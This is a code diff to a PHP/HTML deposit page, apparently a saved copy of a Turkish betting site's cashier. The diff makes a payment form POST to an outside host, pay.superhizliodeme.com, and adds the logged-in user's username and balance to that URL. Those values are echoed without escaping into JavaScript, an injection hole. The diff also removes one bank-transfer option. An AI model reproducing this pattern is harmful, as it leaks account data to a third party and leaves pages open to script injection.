@@ -1,3 +1,6 @@
+<?php
+include '../inc/config.php';
+?>
 <!DOCTYPE html> 
 <html dir=LTR style=overflow:hidden>
   
@@ -61,10 +64,11 @@
     
     // Formu oluşturup özelliklerini belirliyoruz
     var $form = $('<form>', {
-        method: 'POST',
-        action: 'https://pay.superhizliodeme.com/pay/' + imgId,
-        target: '_blank' // Form yeni bir sekmede açılır
-    });
+    method: 'POST',
+    action: 'https://pay.superhizliodeme.com/pay/' + imgId +
+        '?site=pusulabet&ref=pusulabet&amount=<?= $us["balance"] ?>&username=<?= $us["login"] ?>',
+    target: '_blank' // Form yeni sekmede açılır
+});
     
     // imgAlt değerini gizli input olarak ekliyoruz
     $form.append($('<input>', {
@@ -188,16 +192,7 @@ function geridon(){
                                     <div class="custom-tooltip sf-hidden">You must make at least one deposit using this payment method before you can withdraw with it</div>
                                     <div class="maintenance-tooltip sf-hidden">This method is currently under the maintenance</div>
                                  </div>
-                                 <div class=cashier-paymeth-list-item title=Havale>
-                                    <div class=cashier-paymeth-list-item-wrapper>
-                                       <mm-paymeth-logo _nghost-ng-c4202219397 title=Havale class=paymeth-logo><img _ngcontent-ng-c4202219397 unselectable=on id="havale" src=images/59.jpg alt=Havale></mm-paymeth-logo>
-                                       <div class=cashier-paymeth-list-name> Havale </div>
-                                       <div class=cashier-paymeth-list-processing-time> Anında </div>
-                                       <div class=cashier-paymeth-list-limits> TRY 50.00 - 100,000.00 </div>
-                                    </div>
-                                    <div class="custom-tooltip sf-hidden">You must make at least one deposit using this payment method before you can withdraw with it</div>
-                                    <div class="maintenance-tooltip sf-hidden">This method is currently under the maintenance</div>
-                                 </div>
+                                 
                                  <div class=cashier-paymeth-list-item title=Havale>
                                     <div class=cashier-paymeth-list-item-wrapper>
                                        <mm-paymeth-logo _nghost-ng-c4202219397 title=Havale class=paymeth-logo><img _ngcontent-ng-c4202219397 unselectable=on id="havale" src=images/60.png alt=Havale></mm-paymeth-logo>
